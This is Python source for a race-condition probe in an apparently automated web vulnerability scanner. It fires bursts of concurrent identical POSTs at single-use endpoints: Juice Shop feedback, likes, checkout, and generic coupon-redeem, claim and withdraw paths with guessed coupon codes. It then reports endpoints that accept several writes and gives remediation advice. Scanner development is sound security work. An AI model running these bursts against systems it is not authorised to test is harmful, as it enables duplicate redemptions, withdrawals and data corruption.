"""Race-condition probe (TOCTOU on single-use endpoints).

Servers that gate state changes behind a uniqueness check (one feedback
per captcha, one like per user, one checkout per basket) are vulnerable
when the check and the write are not atomic. Firing N concurrent POSTs
of the same payload often slips multiple writes past a check that was
designed to allow exactly one.

Three-step shape:

1. Discovery: walk a list of single-use endpoints. Each one is a POST
   that the server is supposed to accept exactly once for the same
   subject (same captcha id, same user-product pair, same basket id).

2. Race burst: fire 15 concurrent POSTs of the same payload using
   asyncio.gather. No sequential delay; the goal is to land them in
   the same window the check-then-write race opens up.

3. Detection: count 2xx responses. If MORE THAN ONE came back accepted,
   the uniqueness check is bypassable. Five or more clear 2xxs is
   strong evidence the endpoint has no rate limit and no atomic gate.

Targets four Juice Shop challenges at once: #14 CAPTCHA Bypass,
#54 Multiple Likes, #103 Allowlist Bypass, #104 Multiple Feedbacks.
Tagged `destructive-low` because each accepted request persists a row.
"""
from __future__ import annotations

import asyncio
from typing import Any

import aiohttp

from engine.probes import ProbeContext, registry
from engine.probes.auth.runner import auth_headers
from engine.probes.primitives import http_post_json

# Concurrent request count. Capped at 15 per probe spec.
RACE_BURST_SIZE = 15

# Per-request timeout. The whole probe budget is 15s; each request must
# return well inside that even when the server is throttling.
_REQUEST_TIMEOUT = aiohttp.ClientTimeout(total=5)


def _feedback_payload(idx: int) -> dict[str, Any]:
    """Juice Shop feedback row, single-use behind captcha check."""
    return {
        "comment": f"ptai-race-{idx}",
        "rating": 1,
        "captchaId": 1,
        "captcha": "1",
    }


def _review_payload(idx: int) -> dict[str, Any]:
    """Product review for product id 1. Should reject duplicates per user."""
    return {
        "message": f"ptai-race-review-{idx}",
        "author": "ptai-canary",
        "product": 1,
    }


def _like_payload(idx: int) -> dict[str, Any]:
    """Like vote on product id 1. Single-use per user-product pair."""
    return {"id": 1}


def _checkout_payload(idx: int) -> dict[str, Any]:
    """Basket checkout. Should accept exactly one finalisation per basket."""
    return {"couponData": "", "orderDetails": {}}


# Common coupon codes. Each one gets its own concurrent burst — the
# burst itself proves whether the code is seeded AND whether the gate
# is atomic. WELCOME10 stays first so the in-process honeypot test
# (which seeds that exact code) short-circuits on its first try.
COMMON_COUPON_CODES: tuple[str, ...] = (
    "WELCOME10",
    "SAVE10",
    "SAVE25",
    "DISCOUNT10",
    "PROMO",
    "FIRSTORDER",
)


def _coupon_redeem_payload(idx: int, code: str = "WELCOME10") -> dict[str, Any]:
    """Coupon-redemption. Single-use per coupon code per user."""
    return {"code": code, "voucher": code, "promo": code}


def _generic_claim_payload(idx: int) -> dict[str, Any]:
    """Generic claim/redeem with no body specifics — endpoints that
    derive the target from the authenticated session alone.
    """
    return {}


# (path, payload_factory, requires_auth) per single-use endpoint we probe.
# requires_auth=True endpoints are skipped unless ctx.captured_auth is set.
RACE_TARGETS: tuple[tuple[str, Any, bool], ...] = (
    ("/api/Feedbacks", _feedback_payload, False),
    ("/api/Reviews", _review_payload, False),
    ("/api/Likes", _like_payload, False),
    ("/rest/basket/1/checkout", _checkout_payload, True),
    # Generic single-use mutation endpoints (the honeypot test showed
    # the Juice-Shop-only list missed common modern-app paths).
    ("/api/coupons/redeem", _coupon_redeem_payload, True),
    ("/api/coupon/redeem", _coupon_redeem_payload, True),
    ("/coupons/redeem", _coupon_redeem_payload, True),
    ("/api/redeem", _coupon_redeem_payload, True),
    ("/api/claim", _generic_claim_payload, True),
    ("/api/withdraw", _generic_claim_payload, True),
    ("/api/vote", _like_payload, True),
)


def _is_2xx(status: int) -> bool:
    return 200 <= status < 300


async def _safe_post(
    session: Any, url: str, payload: dict[str, Any], headers: dict[str, str] | None
) -> tuple[int, str]:
    """POST that always returns (status, body) even on transport failure."""
    try:
        status, _, body = await http_post_json(
            session, url, payload, headers=headers, timeout=_REQUEST_TIMEOUT
        )
        return status, body
    except Exception:  # noqa: BLE001 - sentinel return is the contract
        return 0, ""


def _emit(target: str, accepted: int, total: int) -> dict[str, Any]:
    """Build a finding. HIGH at >=5 accepted, MEDIUM at 2-4."""
    severity = "high" if accepted >= 5 else "medium"
    return {
        "title": (
            f"Race condition on {target}: {accepted}/{total} concurrent "
            "writes accepted"
        ),
        "severity": severity,
        "category": "business_logic",
        "target": target,
        "evidence": (
            f"Fired {total} concurrent POSTs with identical payloads against "
            f"{target}; {accepted} returned 2xx. The endpoint's uniqueness "
            "or rate-limit check is non-atomic and bypassable."
        ),
        "bug_class": "race_condition",
        "owasp": "A04:2021",
        "remediation": (
            "Wrap the uniqueness check and the write in a single database "
            "transaction with a unique constraint, or serialise the operation "
            "behind a per-subject lock. Pair this with a real rate limit on "
            "the endpoint."
        ),
    }


async def _race_burst(
    session: Any,
    url: str,
    payload_factory: Any,
    auth: dict[str, str] | None,
) -> int:
    """Fire RACE_BURST_SIZE+1 concurrent POSTs. Returns 2xx count."""
    coros = [
        _safe_post(session, url, payload_factory(i), auth)
        for i in range(RACE_BURST_SIZE + 1)
    ]
    results = await asyncio.gather(*coros)
    return sum(1 for status, _ in results if _is_2xx(status))


@registry.probe(
    name="web.race_condition",
    bug_class="race_condition",
    severity_max="high",
    owasp="A04:2021",
    runtime_budget_s=15.0,
    tags=("anonymous", "high-roi", "destructive-low", "concurrent"),
    requires_auth=False,
)
async def probe_race_condition(ctx: ProbeContext) -> list[dict[str, Any]]:
    """Fire concurrent POST bursts at single-use endpoints; flag multi-2xx.

    Single batch (1 baseline + 15 racers) so they all hit inside the
    same race window — sequencing a baseline before the burst lets
    apps with a slow check-then-update gate commit the first write
    before any racer arrives, hiding the bug.

    For coupon endpoints we burst once PER candidate code (apps seed
    different codes — WELCOME10, SAVE10, SAVE25, etc.) — the burst is
    self-validating: an unseeded or already-consumed code returns
    accepted=0 and we move on; an atomically-gated code returns
    accepted=1 (correct behavior); a racy code returns accepted>1.
    """
    findings: list[dict[str, Any]] = []
    extra = auth_headers(ctx.captured_auth)
    auth = extra or None

    for path, payload_factory, requires_auth in RACE_TARGETS:
        if requires_auth and auth is None:
            continue
        url = ctx.base + path

        if payload_factory is _coupon_redeem_payload:
            for code in COMMON_COUPON_CODES:
                def _p(i: int, _code: str = code) -> dict[str, Any]:
                    return _coupon_redeem_payload(i, code=_code)
                accepted = await _race_burst(ctx.session, url, _p, auth)
                if accepted > 1:
                    findings.append(_emit(url, accepted, RACE_BURST_SIZE + 1))
                    break  # race proven for this endpoint
        else:
            accepted = await _race_burst(ctx.session, url, payload_factory, auth)
            if accepted == 0:
                continue
            if accepted > 1:
                findings.append(_emit(url, accepted, RACE_BURST_SIZE + 1))

    return findings
